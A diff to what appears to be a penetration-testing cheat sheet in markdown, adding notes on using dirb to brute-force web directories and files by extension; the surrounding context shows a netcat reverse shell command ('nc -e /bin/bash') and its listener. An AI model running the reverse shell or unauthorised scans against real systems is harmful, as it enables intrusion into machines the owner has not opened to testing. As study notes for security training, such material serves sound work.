@@ -71,6 +71,19 @@ nc -e /bin/bash <attacking ip> <port>
 Note : /bin/bash can be replaced with path to another shell
 
 ##### On attacking machine : 
+
 ```
 nc -lvnp <port>
 ```
+
+### Dirb
+
+Scan the web server `(http://192.168.1.224/)` for directories using a dictionary file `(/usr/share/wordlists/dirb/common.txt)`:
+
+`dirb http://192.168.1.224/ /usr/share/wordlists/dirb/common.txt`
+
+Finding files with speciifc extensions : 
+
+`dirb http://192.168.1.186:8080/ -X .php,.zip`
+
+`-X` searched for files with following extensions (.php & .zip in this case)
